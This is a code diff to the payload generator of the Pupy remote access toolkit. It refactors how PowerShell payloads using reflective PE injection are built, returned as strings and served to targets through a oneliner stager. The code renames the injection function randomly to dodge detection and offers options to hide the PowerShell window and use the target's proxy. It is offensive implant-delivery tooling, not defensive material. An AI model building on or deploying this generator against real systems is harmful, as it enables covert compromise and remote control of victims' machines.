@@ -269,27 +269,10 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64=False, x86=False):
+def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64=False, x86=False, as_str=False):
 
     SPLIT_SIZE = 100000
     x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
-
-    if not outpath:
-        outfile = tempfile.NamedTemporaryFile(
-            dir=output_dir or '.',
-            prefix='pupy_',
-            suffix='.ps1',
-            delete=False
-        )
-    else:
-        try:
-            os.unlink(outpath)
-        except:
-            pass
-
-        outfile = open(outpath, 'w+b')
-
-    outpath = outfile.name
 
     if both:
         code = """
@@ -341,13 +324,36 @@ def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64
     script      = script.replace('Invoke-ReflectivePEInjection', random_name)
     code        = code.replace('Invoke-ReflectivePEInjection', random_name)
 
-    if both:
-        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1])))
-    elif x64:
-        outfile.write("{0}\n{1}".format(script, code.format(x64InitCode, x64ConcatCode[:-1])))
-    elif x86:
-        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))
+    payload = None
 
+    if both:
+        payload = "{0}\n{1}".format(
+            script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]))
+    elif x64:
+        payload = "{0}\n{1}".format(script, code.format(x64InitCode, x64ConcatCode[:-1]))
+    elif x86:
+        payload = "{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1]))
+
+    if as_str:
+        return payload
+
+    if not outpath:
+        outfile = tempfile.NamedTemporaryFile(
+            dir=output_dir or '.',
+            prefix='pupy_',
+            suffix='.ps1',
+            delete=False
+        )
+    else:
+        try:
+            os.unlink(outpath)
+        except:
+            pass
+
+        outfile = open(outpath, 'w+b')
+
+    outpath = outfile.name
+    outfile.write(payload)
     outfile.close()
 
     return outpath
@@ -515,8 +521,6 @@ def get_parser(base_parser, config):
     parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                             action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
-    parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner locally (default: %(default)s)")
-    parser.add_argument('--oneliner-no-ssl', default=False, action='store_true', help="No ssl for ps1_oneliner stages (default: %(default)s)")
     parser.add_argument('--oneliner-nothidden', default=False, action='store_true', help="Powershell script not hidden target side (default: %(default)s)")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
     parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
@@ -532,7 +536,7 @@ def get_parser(base_parser, config):
         nargs=argparse.REMAINDER, help="launcher options")
     return parser
 
-def pupygen(args, config, display):
+def pupygen(args, config, pupsrv, display):
     scriptlets = load_scriptlets(args.os, args.arch)
 
     if args.list:
@@ -597,7 +601,7 @@ def pupygen(args, config, display):
                 myport = get_listener_port(config, external=args.prefer_external)
 
                 display(Warn(
-                    'Required argument missing, automatically adding parameter'
+                    'Required argument missing, automatically adding parameter '
                     '--host {}:{} from local or external ip address'.format(myip, myport)))
 
                 if '-t' in args.launcher_args or '--transport' in args.launcher_args:
@@ -721,8 +725,7 @@ def pupygen(args, config, display):
         i = conf["launcher_args"].index("--host")+1
         link_ip = conf["launcher_args"][i].split(":",1)[0]
 
-        display(Warn('Press Ctrl+C to stop server'))
-        serve_payload(display, packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
+        serve_payload(display, pupsrv, packed_payload, link_ip=link_ip)
 
         raise NoOutput()
 
@@ -733,21 +736,14 @@ def pupygen(args, config, display):
         if conf['launcher'] in ["connect", "auto_proxy"]:
             from pupylib.payloads.ps1_oneliner import serve_ps1_payload
             link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
-            if not args.oneliner_no_ssl:
-                sslEnabled = True
-            else:
-                sslEnabled = False
-
             if not args.no_use_proxy:
                 useTargetProxy = True
             else:
                 useTargetProxy = False
 
-            display(Warn('Press Ctrl+C to stop server'))
             serve_ps1_payload(
-                display, conf,
-                link_ip=link_ip, port=args.oneliner_listen_port,
-                useTargetProxy=useTargetProxy, sslEnabled=sslEnabled,
+                display, pupsrv, conf,
+                link_ip=link_ip, useTargetProxy=useTargetProxy,
                 nothidden=args.oneliner_nothidden)
             raise NoOutput()
 
@@ -784,7 +780,7 @@ def pupygen(args, config, display):
 
     return os.path.abspath(outpath)
 
-if __name__ == '__main__':
+def main():
     from pupylib.utils.term import hint_to_text
     from traceback import print_exc
 
@@ -799,7 +795,7 @@ if __name__ == '__main__':
     parser = get_parser(argparse.ArgumentParser, config)
     try:
         args = parser.parse_args()
-        pupygen(args, config, display)
+        pupygen(args, config, None, display)
 
     except NoOutput:
         sys.exit(0)
@@ -815,3 +811,7 @@ if __name__ == '__main__':
     except Exception, e:
         print_exc()
         sys.exit(str(e))
+
+
+if __name__ == '__main__':
+    main()
